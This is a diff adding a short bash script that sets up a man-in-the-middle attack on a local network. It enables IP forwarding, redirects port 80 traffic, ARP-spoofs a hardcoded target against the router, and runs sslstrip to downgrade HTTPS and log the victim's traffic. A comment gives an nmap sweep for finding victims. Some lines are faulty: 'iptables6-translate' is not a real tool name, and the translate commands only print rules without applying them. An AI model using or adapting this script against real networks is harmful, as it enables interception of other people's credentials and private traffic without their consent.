@@ -1,0 +1,27 @@
+#!/usr/bin/env bash
+
+iface=enp3s0
+redirect_port=7070
+logfile=$HOME/sslstrip.log
+#ipv4
+target=192.168.1.108 
+router=192.168.1.1
+#ipv6
+target6=
+router6=
+
+sudo -i -u root bash << EOF		# Execute all as root
+  nft flush ruleset
+  echo 1 > /proc/sys/net/ipv4/ip_forward
+  iptables-translate -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $redirect_port
+  # Run this to find the target: nmap -sn 192.168.0-1.0-254
+  arpspoof -i $iface -t $target $router
+
+  # ipv6
+  iptables6-translate -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $redirect_port
+  arpspoof -i $iface -t $target6 $router6
+
+EOF
+
+sslstrip -a -k -f -l $redirect_port -w "$logfile"
+
